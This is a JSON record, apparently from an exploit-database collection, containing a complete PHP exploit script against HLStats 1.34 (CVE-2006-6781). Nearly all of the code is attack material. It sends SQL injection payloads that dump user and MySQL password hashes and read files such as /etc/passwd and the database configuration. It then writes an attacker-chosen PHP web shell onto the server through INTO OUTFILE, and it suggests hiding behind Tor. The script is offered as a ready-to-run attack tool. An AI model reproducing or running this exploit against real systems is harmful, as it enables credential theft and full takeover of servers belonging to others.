{
  "id": "3002",
  "title": "HLStats 1.34 - &#039;hlstats.php&#039; SQL Injection",
  "cve": "CVE-2006-6781",
  "vuln_type": "sqli",
  "code": "<br><b>\r\n<?php\r\n/*\r\nLive Exploit Code\r\nSQL Inection + Path Disclosure\r\nAffects HLStats HLStats <=1.34  and Hlstats >= 1.20\r\nworks with magic_quotes_gpc=On\r\nby Michael Brooks\r\n*/\r\n\r\n print \"<title>HLStats SQL Injection Exploit</title>\r\n <body bgcolor='#009900'>\r\n <font  color='#FF0000'>\r\n<b>--------------------------------------------------------------------------------------------------------------------------------------------></b><br><br>\r\n<center><b> <br>\r\nWelcome To HLstats Exploit code.<br><br>\r\n</b></center> \r\n<br> \r\nSQL Inection + Path Disclosure<br>\r\nAffects Hlstats >= 1.20 to HLStats <=1.34(current)<br>\r\nTested on Linux and Windows<br>\r\nworks with magic_quotes_gpc=On!<br>\r\nHLStats has gone though 5 years with no exploits so this is a Birthday Present!<br>\r\nMerry Christmass!<br>\r\nBy Michael Brooks<br>\r\n<br>\r\n<b>--------------------------------------------------------------------------------------------------------------------------------------------></b><br><br>\r\n\";\r\n \r\n print \"\r\n \t<form action='\".$_SERVER['PHP_SELF'].\"' method='post'>\r\n\t<b>Target:</b><br>\r\n\t<input type='text' name='target' size=32><br>\r\n\t(hint: where the login form is. example: http://domain.com/path/hlstats.php )<br>\r\n\t<br><b>Proxy:</b>(ip:port or name:pass@ip:port)<br>\r\n\t<input type='text' name='proxy' size=32><br>\r\n\t(example: 127.0.0.1:8118   Use <a href='http://tor.eff.org'>Tor</a>+<a href='http://www.privoxy.org/'>Privoxy</a>. )<br>\r\n\t<br><br>\r\n\tIf nothing is changed below this line then the exploit will attempt to get the database login information in plain text.\r\n<b>--------------------------------------------------------------------------------------------------------------------------------------------></b><br><br>\r\n\t<H1>ATTACKS:</H1>\r\n\t<br>\r\n\t<b>Database Selects:</b><br>\r\n\t<br>\r\n\tOBTIAN HLStats logins:<br>\r\n\t<input type='submit' name='button' value='HLStats_Logins'>(Passwords are stored as MD5 hashs, use: <a href='http://www.milw0rm.com/cracker/insert.php'>Milw0rm's MD5 Cracker</a>)<br>\r\n \t\t\r\n \t\t  OBTIAN mysql.user logins:<br>\r\n \t\t<input type='submit' name='button' value='Mysql_Logins'><br>\r\n\t<br>\r\n\r\n\t<br>\r\n \t<b>File IO:</b><br><br>\r\n \t<b>Path Disclosure</b><br>\r\n \t<input type='submit' name='button' value='Path'><br>\r\n\t<br>\r\n\t<b>Plain Text Database Login Information</b><br>\r\n\t<input type='submit' name='button' value='Read_Login'>\r\n\t(This will attempt to read the configuration file for hlstats and dump the PLAIN TEXT database login information.)<br>\r\n\t<br>\r\n\t<b>Read Other File</b><br>\r\n\t<input type='submit' name='button' value='Read_File'>\r\n\t<input type='text' name='read_file' size=50>\r\n\t<br>example: /etc/passwd<br>\r\n\tOR for windows based systems: C:\\\\\\\\WINDOWS\\\\\\\\repair\\\\\\\\sam<br>\r\n\t<br><b>attempt payload:</b>(WARNING,  NO PROXY IS USED FOR UPLOADING PAYLOAD)<br>\r\n\t<input type='submit'  name='button' value='Upload'>\r\n\t &lt?php <input type='text' name='payload' size=50>?&gt <br>\r\n\texample: system('netstat'); <br>\r\n\t\r\n\t</form>\r\n\t<br><b>--------------------------------------------------------------------------------------------------------------------------------------------></b><br>\r\n\t\";\r\n\r\n //generic http class\r\nclass http{\r\n\tvar $proxy_ip='', $proxy_port='', $proxy_name='', $proxy_pass='';\r\n\t\r\n\tfunction http_gpc_send($loc ,$cookie=\"\", $postdata = \"\") { \r\n\t\t //overload function polymorphism between gets and posts\r\n\t\t $url=parse_url($loc);\r\n\t\t if(!isset($url['port'])){\r\n\t\t   $url['port']=80;\r\n\t\t}\r\n\t\t//$ua=$_SERVER['HTTP_USER_AGENT'];\r\n\t\t$ua='GPC/.01';\r\n\t\t if($this->proxy_ip!=''&&$this->proxy_port!=''){\r\n\t\t\t$fp = pfsockopen( $this->proxy_ip, $this->proxy_port, &$errno, &$errstr, 120 );\r\n\t\t\t$url['path']=$url['host'].':'.$url['port'].$url['path'];\r\n\t\t }else{\r\n\t\t\t$fp = fsockopen( $url['host'], $url['port'], &$errno, &$errstr, 120 );\r\n\t\t }\r\n\t\t \r\n\t\t if( !$fp ) {\r\n\t\t    print \"$errstr ($errno)<br>\\nn\";\r\n\t\t } else {\r\n\t\t    if( $postdata=='' ) {\r\n\t\t\tfputs( $fp, \"GET \".$url['path'].\"?\".$url['query'].\" HTTP/1.1\\r\\n\" );\r\n\t\t    } else {\r\n\t\t\tfputs( $fp, \"POST \".$url['path'].\"?\".$url['query'].\" HTTP/1.1\\r\\n\" );\r\n\t\t    }\r\n\t\t    \r\n\t\t    if($this->proxy_name!=''&&$this->proxy_pass!=''){\r\n\t\t\tfputs($fp, \"Proxy-Authorization: Basic \".base64_encode($this->proxy_name.\":\".$this->proxy_pass).\"\\r\\n\\r\\n\");\r\n\t\t    }\r\n\r\n\t\t    fputs($fp, \"Host: \".$url['host'].\":\".$url['port'].\"\\r\\n\");\r\n\t\t    fputs( $fp, \"User-Agent: \".$ua.\"\\r\\n\" );\r\n\t\t    fputs( $fp, \"Accept: text/plain\\r\\n\" );\r\n\t\t    fputs( $fp,\"Connection: Close\\r\\n\" );\r\n\t\t    if($cookie!=''){ \r\n\t\t\tfputs( $fp, \"Cookie: \".$cookie.\"\\r\\n\" );\r\n\t\t    }\r\n\t\t    if( $postdata!='' ) {\r\n\t\t\t$strlength = strlen( $postdata );\r\n\t\t\tfputs( $fp, \"Content-type: application/x-www-form-urlencoded\\r\\n\" );\r\n\t\t\tfputs( $fp, \"Content-length: \".$strlength.\"\\r\\n\\r\\n\" );\r\n\t\t\tfputs( $fp, $postdata);\r\n\t\t    }\r\n\t\t    fputs( $fp, \"\\n\\n\" );\r\n\t\t    \r\n\t\t   $output = \"\";\r\n\t\t   while( !feof( $fp ) ) {\r\n\t\t\t$output .= fgets( $fp, 1024 );\r\n\t\t   }\r\n\t\t    fclose( $fp );\r\n\t\t }\r\n\t\t return $output;\r\n\t}\r\n\t\r\n\tfunction proxy($proxy){ //user:pass@ip:port\r\n\t\t$proxyAuth=explode('@',$proxy);\r\n\t\tif(isset($proxyAuth[1])){\r\n\t\t\t$login=explode(':',$proxyAuth[0]);\r\n\t\t\t$this->proxy_name=$login[0];\r\n\t\t\t$this->proxy_pass=$login[1];\r\n\t\t\t\r\n\t\t\t$addr=explode(':',$proxyAuth[1]);\r\n\t\t\t$this->proxy_ip=$addr[0];\r\n\t\t\t$this->proxy_port=$addr[1];\r\n\t\t}else{\r\n\t\t\t$addr=explode(':',$proxy);\r\n\t\t\t$this->proxy_ip=$addr[0];\r\n\t\t\t$this->proxy_port=$addr[1];\r\n\t\t}\r\n\t}\r\n\t\r\n\tfunction get($url, $cookie=''){\r\n\t\treturn $this->http_gpc_send($url, $cookie);\r\n\t}\r\n\r\n\tfunction post($url, $cookie='', $post=''){\r\n\t\treturn $this->http_gpc_send($url,$cookie,$post);\r\n\t}\r\n\t\r\n\tfunction getServer($url){\r\n\t\t$resp=$this->http_gpc_send($url);\r\n\t\t$header=explode(\"Server: \",$resp);\r\n\t\t$server=explode(\"\\n\",$header[1]);\r\n\t\treturn $server[0];\r\n\t}\r\n}\r\n\r\n//reuseable functions\r\nfunction getPath($html){\r\n\t$path='';\r\n\t$resp=explode(\"array given in <b>\",$html);\r\n\tif(isset($resp[1])){\r\n\t\t$resp = explode(\"</b>\",$resp[1]);\r\n\t}else{\r\n\t\t$resp[0]=false;\r\n\t}\r\n\treturn $resp[0];\r\n}\r\n\r\nfunction charEncode($string){\r\n\t$char=\"char(\";\r\n\t$size=strlen($string);\r\n\tfor($x=0;$x<$size;$x++){\r\n\t\t$char.=ord($string[$x]).\", \";\r\n\t}\r\n\t$char[strlen($char)-2]=')%00';\r\n\treturn $char;\r\n}\r\n\r\nfunction hex_encode($my_string)\r\n{\r\n$encoded=\"0x\";\r\n  for ($k=0; $k<=strlen($my_string)-1; $k++)\r\n  {$temp=dechex(ord($my_string[$k]));\r\n    if (strlen($temp)==1) {$temp=\"0\".$temp;}\r\n    $encoded.=$temp;\r\n  }\r\n  return $encoded;\r\n} \r\n\r\n\r\n//hlstats specific functions\r\nfunction hl_get_sql($resp){\r\n\t//print htmlspecialchars($resp);\r\n\t$tmp=explode('<table ',$resp);\r\n\tarray_pop($tmp);\r\n\t$last=array_pop($tmp);\r\n\t$tbl=explode('</table>',$last);\r\n\t$table=$tbl[0];//ITS MY TABLE NOW!\r\n\tif(strstr($table,'Victim')&&strstr($table,'Times Killed')){\r\n\t\t$table=str_replace('border=0','border=1',$table);\r\n\t\t$table=str_replace('#002E8A','#000000',$table);\r\n\t\t$table=str_replace('#15154D','#CCCCCC',$table);\r\n\t\t$table=str_replace('#161652','#CCCCCC',$table);\r\n\t\t$table='<table '.$table.'</table>';\r\n\t}else{\r\n\t\t$table=false;\r\n\t}\r\n\treturn $table;\r\n}\r\n\r\nfunction get_logins($addr){\r\n\t$http=new http();\r\n\t$data='';\r\n\t$resp=$http->get($addr.\"?mode=playerinfo&player=1&playerdata[lastName][]=1\");\r\n\t$path=getPath($resp);\r\n\t$readfile=hex_encode($path);\r\n\t$pay=\"killLimit=99999%20union%20select%20load_file($readfile),1,1,1,1%20--%20\";\r\n\t$resp=$http->post($addr.\"?mode=playerinfo&player=1\",'',$pay);\r\n\t\t\r\n\t$tmp=explode(\"define(&quot;DB_NAME&quot;, &quot;\",$resp);\r\n\t$tmp=explode(\"&quot;\",$tmp[1]);\r\n\t$data[db]=$tmp[0];\r\n\r\n\t$tmp=explode(\"define(&quot;DB_USER&quot;, &quot;\",$resp);\r\n\t$tmp=explode(\"&quot;\",$tmp[1]);\r\n\t$data[name]=$tmp[0];\r\n\t\r\n\t$tmp=explode(\"define(&quot;DB_PASS&quot;, &quot;\",$resp);\r\n\t$tmp=explode(\"&quot;\",$tmp[1]);\r\n\t$data[pass]=$tmp[0];\r\n\t\r\n\t$tmp=explode(\"define(&quot;DB_ADDR&quot;, &quot;\",$resp);\r\n\t$tmp=explode(\"&quot;\",$tmp[1]);\r\n\t$data[addr]=$tmp[0];\r\n\t\r\n\t$tmp=explode(\"define(&quot;DB_TYPE&quot;, &quot;\",$resp);\r\n\t$tmp=explode(\"&quot;\",$tmp[1]);\r\n\t$data[type]=$tmp[0];\r\n\t\r\n\treturn $data;\r\n}\r\n\r\n//The table prefix is needed to union select the hlstats logins\r\nfunction get_prefix($attack){\r\n\t$prefix=false;\r\n\t$http=new http();\r\n\t//hex_encode is used instead of quote marks\r\n\t$payload=\"killLimit=1000%20union%20select%20TABLE_NAME,TABLE_SCHEMA,1,1,1%20from%20information_schema.TABLES%20WHERE%20TABLE_NAME%20LIKE%20\".hex_encode(\"%events_playerplayeractions\").\"%23\";\r\n\t$resp=$http->post($attack.\"?mode=playerinfo&player=1\",'',$payload);\r\n\t$mid=explode('events_playerplayeractions',$resp);\r\n\tif(is_array($mid)){\r\n\t\tforeach($mid as $m){\r\n\t\t\t$pre= explode('>',$m);\r\n\t\t\t$fix=array_pop($pre);\r\n\t\t\tif(is_array($prefix)){\r\n\t\t\t\tif(!in_array($fix,$prefix)){\r\n\t\t\t\t\t$prefix[]=trim($fix);\r\n\t\t\t\t}\r\n\t\t\t}else if($prefix!=$fix){\r\n\t\t\t\tprint($fix);\r\n\t\t\t\t$prefix[]=trim($fix);\r\n\t\t\t}\r\n\t\t}\r\n\t\tif(is_array($prefix)){\r\n\t\t\t$v=array_pop($prefix);\r\n\t\t\tif(trim($v)!='0'){//damn that zero!!\r\n\t\t\t\tarray_push($prefix,$v);\r\n\t\t\t}\r\n\t\t}\r\n\t}else{\r\n\t\t$prefix=false;\r\n\t}\r\n\treturn($prefix);\r\n}\r\n\r\nif(isset($_REQUEST['target'])&&$_REQUEST['target']!=''){\r\n\t//this exploit can take its sweet time. \r\n\tset_time_limit(0);\r\n\t$http=new http();\r\n\t$addr=explode('?',$_REQUEST['target']);\r\n\t$addr=$addr[0];\r\n\tif(isset($_REQUEST['proxy'])){\r\n\t\t$http->proxy($_REQUEST['proxy']);\r\n\t} \r\n\t\r\n\tswitch($_REQUEST['button']){\r\n\t\tcase 'HLStats_Logins':\r\n\t\t\t$table=false;\r\n\t\t\t$prefix=get_prefix($addr);\r\n\t\t\t//print_r($prefix);\r\n\t\t\tforeach($prefix as $pre){\r\n\t\t\t\tif(!$table){\r\n\t\t\t\t\tprint \"trying table prefix:$pre<br>\";\r\n\t\t\t\t\t//no comments are used in this payload,  instead a second union select is used to finnish the query.\r\n\t\t\t\t\t$pay=\"killLimit=1000%20union%20select%20username,password,acclevel,1,playerId%20from%20\".$pre.\"Users%20UNION%20SELECT%201,1,1,1,1%20FROM%20\".$pre.\"Players%20WHERE%201=0\";\r\n\t\t\t\t\t$resp=$http->post($addr.\"?mode=playerinfo&player=1\",'',$pay);\r\n\t\t\t\t\t$table=hl_get_sql($resp);//  \r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tif(!$table&&@!in_array('hlstats_',$prefix)){//ooah no the exploit has failed so far. \r\n\t\t\t\t\t$pre=\"hlstats_\";//try the default prefix\r\n\t\t\t\t\tprint \"trying table prefix:$pre<br>\";\r\n\t\t\t\t\t$pay=\"killLimit=1000%20union%20select%20username,password,acclevel,1,playerId%20from%20\".$pre.\"Users%20UNION%20SELECT%201,1,1,1,1%20FROM%20\".$pre.\"Players%20WHERE%201=0\";\r\n\t\t\t\t\t$resp=$http->post($addr.\"?mode=playerinfo&player=1\",'',$pay);\r\n\t\t\t\t\t$table=hl_get_sql($resp);//  \t\t\t\r\n\t\t\t}\r\n\t\t\tif($table){\r\n\t\t\t\t$table=str_replace('Victim','username',$table);\r\n\t\t\t\t$table=str_replace('Kills per Death','playerId',$table);\r\n\t\t\t\t$table=str_replace('Deaths by','acclevel',$table);\r\n\t\t\t\t$table=str_replace('Times Killed','password',$table);\r\n\t\t\t\t$table=str_replace('Rank','Count',$table);\r\n\t\t\t\tprint \"<br>$table\";\r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\tcase 'Mysql_Logins':\r\n\t\t\t//a comment is used so the table prefix doesn't have to be known;  this is simpler,  less to go wrong.  \r\n\t\t\t$pay=\"killLimit=1000%20union%20select%20user,password,File_priv,1,Host%20%20from%20mysql.user%20--%20\";\r\n\t\t\t$resp=$http->post($addr.\"?mode=playerinfo&player=1\",'',$pay);\r\n\t\t\t$table=hl_get_sql($resp);\r\n\t\t\t$table=str_replace('Victim','User',$table);\r\n\t\t\t$table=str_replace('Kills per Death','Host',$table);\r\n\t\t\t$table=str_replace('Deaths by','File_priv',$table);\r\n\t\t\t$table=str_replace('Times Killed','Password',$table);\r\n\t\t\t$table=str_replace('Rank','Count',$table);\r\n\t\t\tprint \"<br>$table\";\r\n\t\tbreak;\r\n\t\tcase 'Read_File':\r\n\t\t\t$readfile=hex_encode($_REQUEST[read_file]);\r\n\t\t\t$pay=\"killLimit=99999%20union%20select%20load_file($readfile),1,1,1,1%20--%20\";\r\n\t\t\t$resp=$http->post($addr.\"?mode=playerinfo&player=1\",'',$pay);\t\t\t\r\n\t\t\t$tmp=explode('alt=\"player.gif\"><b>',$resp);\r\n\t\t\t$data=explode(\"</font>\",$tmp[1]);\r\n\t\t\t$data=$data[0];\r\n\t\t\t//this might be a bad thing:\r\n\t\t\t$data=preg_replace('<br />','',$data);\r\n\t\t\tprint 'data'.$data; \t\t\r\n\t\tbreak;\r\n\t\tcase 'Path':\r\n\t\t\t$resp=$http->get($addr.\"?mode=playerinfo&player=1&playerdata[lastName][]=1\");\r\n\t\t\t$path=getPath($resp );\r\n\t\t\tprint \"Path Disclosure:$path<br>\";\r\n\t\tbreak;\t\r\n\t\tcase 'Read_Login':\r\n\t\t\t$data=get_logins($addr);\r\n\t\t\tforeach($data as $var=>$val){\r\n\t\t\t\t   $tmp=explode('&quot',$val);\r\n\t\t\t\t\t$data[$var]=$tmp[0];\r\n\t\t\t\t\tprint \"<br>\".$var.\":\".$tmp[0];\r\n\t\t\t}\t\r\n\t\tbreak;\r\n\t\tcase 'Upload':\r\n\t\t\t$resp=$http->get($addr.\"?mode=playerinfo&player=1&playerdata[lastName][]=1\");\r\n\t\t\t$path=getPath($resp );\r\n\t\t\t$data=get_logins($addr);\r\n\t\t\tprint $path.\"<br>\";\r\n\t\t\t$tar=explode('/',$_REQUEST['target']);\r\n\t\t\t$paylink=$tar;\r\n\t\t\tarray_pop($paylink);\r\n\t\t\t$paylink=implode('/',$paylink);\r\n\t\t\tif(strstr($path,':')){//if windows\r\n\t\t\t\tprint \"Windows Sytem<br>\";\r\n\t\t\t\t$temp=explode('\\\\',$path);\r\n\t\t\t}else{//else *nix\r\n\t\t\t\tprint \"*nix System<br>\";\r\n\t\t\t\t$temp=explode('/',$path);\r\n\t\t\t}\r\n\t\t\tarray_pop($temp);\r\n\t\t\t$path=implode('/',$temp);\r\n\t\t\tmysql_connect($tar[2],$data[name],$data[pass]) or die(mysql_error());\r\n\t\t\t$name=\"data\".rand();//rand is used so that this attack can be run multiple times.\r\n\t\t\t$sql=\"SELECT '<?php \".$_REQUEST[payload].\"?>' INTO OUTFILE '$path/$name.php'\";\r\n\t\t\tprint \"<br><a href='$paylink/$name.php'><b> Execute Payload </b></a>\";\r\n\t\t\tmysql_query($sql) or die(mysql_error());\r\n\t\tbreak;\r\n\t\tdefault:\r\n\t\t\tprint 'No Attack!';\r\n\t\tbreak;\r\n\t}\r\n}else{\r\n\tPrint \"No Target.\";\r\n}\r\n?><br>--------------------------------------------------------------------------------------------------------------------------------------------><br>\r\n\r\n# milw0rm.com [2006-12-25]",
  "url": "https://www.exploit-db.com/exploits/3002"
}